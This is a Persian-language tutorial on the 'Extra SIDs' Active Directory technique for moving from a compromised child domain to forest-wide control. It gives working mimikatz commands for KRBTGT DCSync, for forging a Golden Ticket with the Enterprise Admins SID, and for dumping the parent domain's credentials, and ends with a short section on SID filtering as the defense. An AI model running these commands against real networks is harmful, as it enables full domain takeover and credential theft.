

# **Owning the Forest with Extra SIDs**

---

## **مفهوم اصلی:**

وقتی یک **Child Domain** رو compromise می‌کنیم، می‌تونیم با استفاده از **SID History** به **Parent Domain** (یا کل **Forest**) دسترسی پیدا کنیم.

---

## **مفاهیم پایه:**

### **1. Domain vs Forest:**

Forest: prod.corp
├── Parent Domain: prod.corp (Domain Controller: DC01)
└── Child Domain: dev.prod.corp (Domain Controller: DEVDC01)


- **Forest:** مجموعه‌ای از Domain‌ها که به هم trust دارن
- **Parent Domain:** Domain اصلی (ریشه Forest)
- **Child Domain:** Domain فرعی که زیرمجموعه Parent هست

---

### **2. SID (Security Identifier):**

هر object در AD یک SID منحصر به فرد داره:

S-1-5-21-3290883668-3893435729-3840647698-1105
│  │  │  └─────────────────────────────────┘ └──┘
│  │  │              Domain ID              RID
│  │  └─ NT Authority
│  └─ Version
└─ Revision


**مثال:**

Domain: prod.corp
SID: S-1-5-21-1234567890-1234567890-1234567890

User: Administrator
SID: S-1-5-21-1234567890-1234567890-1234567890-500
                                                └─ RID (Relative ID)


---

### **3. SID History:**

- یک attribute در AD که **SID‌های قبلی** یک object رو نگه می‌داره
- **هدف اصلی:** وقتی یک user از Domain A به Domain B migrate می‌شه، SID قدیمیش رو حفظ کنه تا دسترسی‌هاش از دست نره

**مثال:**

User: john@dev.prod.corp
SID: S-1-5-21-DEV_DOMAIN-1105
SID History: S-1-5-21-PROD_DOMAIN-1105


وقتی `john` به resource‌های `prod.corp` دسترسی پیدا می‌کنه، Windows **هم SID اصلی و هم SID History** رو چک می‌کنه.

---

## **حمله Extra SIDs:**

### **سناریو:**

1. مهاجم **Child Domain** (`dev.prod.corp`) رو compromise کرده
2. می‌خواد به **Parent Domain** (`prod.corp`) دسترسی پیدا کنه

---

### **مراحل حمله:**

#### **مرحله 1: دامپ کردن KRBTGT Hash از Child Domain**

```powershell
# روی DEVDC01 (Child DC)
mimikatz # lsadump::dcsync /domain:dev.prod.corp /user:krbtgt
```

خروجی:
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e


**چرا KRBTGT؟**

- **KRBTGT** account برای sign کردن **TGT**ها استفاده می‌شه
- با hash این account می‌تونیم **Golden Ticket** بسازیم

---

#### **مرحله 2: پیدا کردن SID Parent Domain**

```powershell
Get-DomainSID -Domain prod.corp
```

خروجی:
S-1-5-21-3290883668-3893435729-3840647698


---

#### **مرحله 3: ساخت Golden Ticket با Extra SID**

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:dev.prod.corp /sid:S-1-5-21-CHILD_DOMAIN /krbtgt:2892d26cdf84d7a70e2eb3b9f05c425e /sids:S-1-5-21-PARENT_DOMAIN-519 /ptt
```

**پارامترها:**

| **پارامتر** | **مقدار** | **توضیح** |
|-------------|-----------|-----------|
| `/user:` | `Administrator` | نام کاربر جعلی (می‌تونه هر چیزی باشه) |
| `/domain:` | `dev.prod.corp` | Child Domain |
| `/sid:` | `S-1-5-21-CHILD_DOMAIN` | SID Child Domain |
| `/krbtgt:` | `2892d26...` | Hash KRBTGT Child Domain |
| `/sids:` | `S-1-5-21-PARENT_DOMAIN-519` | **Extra SID** (Enterprise Admins) |
| `/ptt` | - | Inject کردن تیکت به حافظه |

---

### **کلید حمله: Extra SID**

/sids:S-1-5-21-PARENT_DOMAIN-519
                              └─ RID 519 = Enterprise Admins


**RID‌های مهم:**

| **RID** | **گروه** | **دسترسی** |
|---------|---------|-----------|
| `500` | Administrator | Admin یک Domain |
| `512` | Domain Admins | Admin یک Domain |
| `519` | **Enterprise Admins** | **Admin کل Forest** |

---

#### **مرحله 4: تست دسترسی به Parent Domain**

```powershell
# دسترسی به DC Parent Domain
ls \\DC01.prod.corp\c$

# DCSync روی Parent Domain
mimikatz # lsadump::dcsync /domain:prod.corp /user:prod\Administrator
```

---

## **چرا این حمله کار می‌کنه؟**

### **Trust بین Parent و Child:**

dev.prod.corp  ←→  prod.corp
(Child Domain)     (Parent Domain)


- Child و Parent به هم **Two-Way Trust** دارن
- وقتی یک TGT از Child Domain میاد، Parent Domain **SID History** رو هم چک می‌کنه
- اگه SID History شامل `Enterprise Admins` باشه، Parent Domain فکر می‌کنه این user عضو Enterprise Admins هست

---

## **دفاع: SID Filtering**

### **مشکل:**

اگه **SID Filtering** فعال باشه، این حمله کار نمی‌کنه.

### **چک کردن SID Filtering:**

```powershell
Get-DomainTrust -Domain dev.prod.corp
```

خروجی:
SourceName      : dev.prod.corp
TargetName      : prod.corp
TrustDirection  : Bidirectional
SIDFilteringQuarantined : False  ← اگه False باشه، حمله کار می‌کنه


**اگه `True` باشه:**

- Parent Domain SID‌های خارج از Child Domain رو **فیلتر می‌کنه**
- Extra SID حذف می‌شه و حمله fail می‌شه

---

## **مثال عملی:**

### **سناریو:**

Forest: prod.corp
├── prod.corp (DC: DC01)
└── dev.prod.corp (DC: DEVDC01)


### **مراحل:**

#### **1. Compromise کردن DEVDC01:**

```powershell
# دامپ KRBTGT
mimikatz # lsadump::dcsync /domain:dev.prod.corp /user:krbtgt
```

#### **2. پیدا کردن SID‌ها:**

```powershell
# SID Child Domain
Get-DomainSID -Domain dev.prod.corp
# S-1-5-21-1111111111-1111111111-1111111111

# SID Parent Domain
Get-DomainSID -Domain prod.corp
# S-1-5-21-2222222222-2222222222-2222222222
```

#### **3. ساخت Golden Ticket:**

```powershell
mimikatz # kerberos::golden /user:FakeAdmin /domain:dev.prod.corp /sid:S-1-5-21-1111111111-1111111111-1111111111 /krbtgt:2892d26cdf84d7a70e2eb3b9f05c425e /sids:S-1-5-21-2222222222-2222222222-2222222222-519 /ptt
```

#### **4. دسترسی به Parent:**

```powershell
ls \\DC01.prod.corp\c$
mimikatz # lsadump::dcsync /domain:prod.corp /user:Administrator
```

---

## **خلاصه:**

| **مرحله** | **عمل** |
|-----------|---------|
| 1 | Compromise کردن Child Domain DC |
| 2 | دامپ KRBTGT hash از Child Domain |
| 3 | پیدا کردن SID Parent Domain |
| 4 | ساخت Golden Ticket با Extra SID (`Enterprise Admins`) |
| 5 | دسترسی به Parent Domain و کل Forest |

**کلید حمله:** اضافه کردن SID گروه `Enterprise Admins` (RID 519) به SID History تیکت جعلی.